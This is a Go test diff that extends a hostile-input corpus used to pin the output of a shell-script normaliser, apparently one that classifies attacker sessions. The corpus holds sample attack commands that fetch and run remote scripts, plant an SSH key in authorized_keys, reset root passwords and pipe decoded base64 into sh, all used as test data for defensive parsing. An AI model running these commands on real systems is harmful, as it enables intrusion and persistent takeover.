@@ -13,7 +13,8 @@ import (
 // versionPin ties the normaliser's observable output to Version. The digest
 // covers, for a fixed hostile corpus, every value a stored script keeps:
 // the encoding, Display, CommandCount, Distinctive and len(Tokens), plus
-// the constants that shape tokens and families. If this test fails:
+// each segment's program() (which decides Distinctive) and the constants
+// and tables that shape tokens, programs and families. If this test fails:
 //
 //   - you changed an encoding or one of those values: bump script.Version,
 //     extend its history comment, then set versionPin to the new Version and
@@ -25,26 +26,95 @@ import (
 var versionPin = struct {
 	version int
 	digest  string
-}{4, "3cfaac85c76076d61a49049ba069e8dd92e3ec69e86b2b92182d75876cf21509"}
+}{4, "c0bde52178955e56a2c7f47a21a17751aa6ee3fee0181283160870e6e32bc1f8"}
 
+// versionCorpus has, for every normalisation rule, at least one input
+// whose encoding, Display, CommandCount, Distinctive or per-segment
+// programs depend on that rule; recon-only scripts check program detection
+// through Distinctive, and the programs are pinned directly as well. When
+// you add a rule, add an input here that it changes (the re-review found
+// five rules the first corpus could not see).
 var versionCorpus = []string{
+	// Plain, placeholders as whole tokens.
 	`uname -s -v -n -r -m`,
 	`cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh`,
-	`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
-	`echo "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`,
-	"echo \"root:123456789\nx\r\" | chpasswd; echo deadbeefdeadbeefdeadbeef",
 	`curl -s 10.0.0.9:8080/a|bash; chmod 777 /tmp/kxhqwe; /tmp/kxhqwe`,
-	`uname -a 2>&1; whoami >/dev/null 2>&1; 0</dev/null id; x >| f; y 3<>g`,
-	`nice -n 5 python3 x; sudo -u root -- wget x; timeout -s 9 30 env A=1 stdbuf -oL nohup busybox ls; sudo --weird python3`,
-	`echo "<url>" '<key>' "a<b http://x/y>c"`,
-	`> $(evil) python3; 2>/tmp/$(date) wget x; >& f id; <&0 id; id 2>&-`,
+	`echo deadbeefdeadbeefdeadbeef 123456 12345 aGVsbG8gV29ybGQgMTIzNDU2Nzg5MA== abc123def`,
+	`echo 0123456789abcde 0123456789abcdef 1234567890123456 123456789012345`, // hexRe's 16 boundary
+	// Keys: a real blob, a non-key AAAA run, and keyTypeWords.
+	`echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC/47d8xbCuUjYsBrxtmLjL4FDUe3BPIemNktjPY mdrfckr" >> .ssh/authorized_keys`,
+	`echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKBT1fubDzcjP8Ntf33MZwaTgCpwTQRaj7IrSvXO0lBU k" ed25519 nistp256`,
+	`echo "f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | base64 -d > x`,
+	// Quoted text: markerRe, randomInside, hexIn and numIn boundaries,
+	// typed \n, real newline and CR, URL/IP/tmp inside quotes.
+	`echo a1b2c a1b2c3 "a1b2c" "a1b2c3" 'vT' "abcd" "abcde" "root\ndp75z0biqzBE\ndp75z0biqzBE" | passwd`,
+	"echo \"root:123456789\" \"pin 12345\" \"k=0123456789abcdef x\" \"k=0123456789abcde x\"",
+	"echo \"a\nb\" \"c\r\" \"d\\ne\" \"http://x/y 1.2.3.4:80/p /tmp/zz\"",
+	`echo "<url>" '<key>' "a<b http://x/y>c" "\http://x/y"`,
+	"echo `wget http://x/y`; echo `cat /tmp/kxq`; echo `curl 1.2.3.4/a`",
+	// Wrappers: every wrapper and option form, the unknown-option stop.
+	`nice -n 5 python3 x; nice -19 python3 y; nice --adjustment=3 python3 z`,
+	`sudo -u root -- wget x; sudo -E -s python3 a; sudo --user=root python3 b; sudo --weird python3 c; sudo -Z python3 d`,
+	`timeout -s 9 30 python3 x; timeout --kill-after=5 30s python3 y; env -i A=1 python3 z; env -u X python3 w`,
+	`stdbuf -oL python3 x; stdbuf -o L python3 y; exec -a n python3 z; command -p python3 w; time -p python3 v`,
+	`nohup python3 x; busybox python3 y; x=1 python3 z; command -v wget; type python3; hash perl`,
+	// Recon-only scripts: each must stay non-Distinctive.
+	`nice -n 5 id; timeout 3 uname -a; sudo -u root whoami; w; uptime`,
+	`2>/dev/null id; >/dev/null uname -a; w; uptime; whoami`,
+	`command -v wget; command -V curl; type python3; hash perl; id; uname -a`,
+	`'id'; "uname" -a; 'w'; 'ls'; 'ps'`,
+	`{ id; w; uname -a; uptime; }`,
+	`if id; then uname -a; else w; fi; uptime; whoami`,
+	`while w; do uptime; done; until id; do ls; done; ! whoami`,
+	`for i in 1 2; do id; done; case $x in a) w;; esac; [[ -f x ]] && ls; select y in a; do id; done; function f`,
+	`0</dev/null uname -a; id; w; uptime; whoami`,
+	`echo x >| /tmp/a; id 3<> /tmp/b; w; uptime; whoami`,
+	"0<<EOF id\nx\nEOF\nw; uptime; whoami; uname",
+	"cat <<EOF\nid\nw\nuptime\nwhoami\nls\nEOF",
+	// Distinctive through a <url> or <key> anywhere in a token.
+	"cat <<EOF > /tmp/a\nhttp://x/y\nEOF\nid; w; uptime; whoami",
+	`echo "a<b http://x/y"; id; w; uptime; whoami`,
+	// Redirections and their targets.
+	`uname -a 2>&1; whoami >/dev/null 2>&1; x &> f; y &>> g; z >> h; 2>> i id`,
+	`> /tmp/a python3 x; 2>/dev/null python3 y; < /tmp/kxhqwe python3; > abc123def python3`,
+	`>& f id; >&/tmp/a id; <&0 id; id 2>&-; <& f id; id <&3; id 2>&1 & wget x`,
+	`> $(evil) python3; > $(a $(b)) python3; 2>/tmp/$(date) wget x; > $(evil python3`,
+	"> $(a\nwget x; > $(a; b) python3; > f (id)",
+	`<<< x python3 y; <<< abc123def python3; 2<<<x python3; base64 -d <<< "Zm9v" | sh`,
+	`a && b || c | d & e ; f`,
+	// Heredoc delimiters: every quoting and escape form bash applies.
 	"cat <<\\EOF > /tmp/a.sh\nwget http://1.1.1.1/a; chmod +x a\nEOF\nsh /tmp/a.sh; rm -f /tmp/a.sh",
+	"cat <<E\"O F\" x\nb\nEO F\nid",
+	"cat <<E\\ OF x\nb\nE OF\nid",
+	"cat <<E\\\nOF x\nb\nEOF\nid",
+	"cat <<\"E\\\"O\\$\\x\" x\nb\nE\"O$\\x\nid",
+	"cat <<$'E\\x41\\101\\u00e9\\cA\\n\\'' x\nb\nEAAé\x01\nid",
+	"cat <<$'E\\x41' x\nb\nE\\x41\nEA\nid",
+	"cat <<$\"EOF\" x\nb\nEOF\nid",
+	"cat <<'E'\"O\"\\F$'' x\nb\nEOF\nid",
+	"cat <<\"E\\`F\\\nG\" x\nb\nE`FG\nid",
+	"cat <<\"EOF\nb\nEOF\nid",
+	"cat <<'EOF\nb\nEOF\nid",
+	"cat <<$'EOF\nb\nEOF\nid",
+	// Heredoc bodies and terminators.
 	"cat <<-\"E O F\" <<B\n\tbody\n\tE O F\nb\nB\nid",
+	"cat <<EOF\r\nbody\r\nEOF\r\nid",
+	"cat <<EOF\n  EOF\nid\nEOF\nwhoami",
+	"cat <<EOF\nEOF\nid\nwget http://x/y",
+	"cat <<EOF\n\nEOF\nid",
+	"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid",
+	"cat <<EOF\n<nl><more> \"q\" 'r\nEOF\nid",
+	"cat <<EOF\nno terminator\nid",
+	"cat <<EOF python3\nbody\nEOF\n<<EOF python3 x\nbody\nEOF",
+	"sudo <<EOF -u root python3\nbody\nEOF",
 	"<<EOF python3 x\n" + strings.Repeat("y", 5000) + "\nEOF",
-	"{ id; w; }; if id; then 'ls'; fi; for i in 1; do \"wget\" x; done; [[ -f x ]]; case a in b) id;; esac",
-	"echo `wget http://x/y`; echo `cat /tmp/kxq`",
+	"cat <<EOF\n" + strings.Repeat("\n", 3000) + "EOF\nid",
+	"cat <<EOF\n" + strings.Repeat("<", 2000) + "\n" + strings.Repeat("\r", 3000) + "\nEOF\nid",
+	"cat << ; id",
+	// Separators and hostile bytes.
 	"\x00\xff'\"\x1e\x1f 2>&1 &>>x",
 	strings.Repeat("a ; ", 400),
+	"echo a\nwhoami",
 }
 
 func TestVersionPinsEncoding(t *testing.T) {
@@ -60,7 +130,11 @@ func TestVersionPinsEncoding(t *testing.T) {
 	for _, s := range versionCorpus {
 		enc := EncodeLine(s)
 		cmds := Split(Join([]string{enc}))
-		fmt.Fprintf(h, "%q %q %d %v %d\n", enc, Display(enc, 120), CommandCount(cmds), Distinctive(cmds), len(Tokens(enc)))
+		var progs []string
+		for _, seg := range segments(cmds) {
+			progs = append(progs, program(seg))
+		}
+		fmt.Fprintf(h, "%q %q %q %d %v %q %d\n", enc, Display(enc, 120), Display(enc, 0), CommandCount(cmds), Distinctive(cmds), progs, len(Tokens(enc)))
 		lines = append(lines, enc)
 	}
 	all := Join(lines)
